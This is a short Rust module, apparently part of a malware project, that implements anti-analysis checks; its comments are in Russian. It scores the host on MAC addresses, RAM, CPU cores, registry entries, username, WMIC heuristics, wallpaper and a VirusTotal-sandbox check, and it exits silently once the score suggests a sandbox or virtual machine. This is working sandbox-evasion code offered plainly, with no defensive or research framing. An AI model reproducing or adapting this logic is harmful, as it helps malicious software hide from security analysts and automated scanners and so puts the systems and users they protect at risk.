pub mod hardware;
pub mod sandbox;
pub mod vm;

// конфиг антианализа
pub struct AntiAnalysisConfig {
    pub required_points: u32,
    pub silent_exit: bool,
}

impl Default for AntiAnalysisConfig {
    fn default() -> Self {
        Self {
            required_points: 5,
            silent_exit: true,
        }
    }
}

// набираем очки по всем проверкам
pub fn run_checks() -> u32 {
    let mut points = 0;

    if hardware::check_mac_addresses() { points += 3; }
    if hardware::check_ram() { points += 4; }
    if hardware::check_cpu_cores() { points += 3; }
    if sandbox::check_registry() { points += 2; }
    if sandbox::check_username() { points += 10; }
    if hardware::check_wmic_heuristics() { points += 10; }
    if sandbox::check_wallpaper() { points += 10; }
    if vm::check_virustotal() { points += 10; }

    points
}

// если набрали достаточно — среда для анализа, выходим
pub fn enforce(config: &AntiAnalysisConfig) {
    let score = run_checks();
    if score >= config.required_points {
        if config.silent_exit {
            std::process::exit(0);
        } else {
            std::process::exit(1);
        }
    }
}
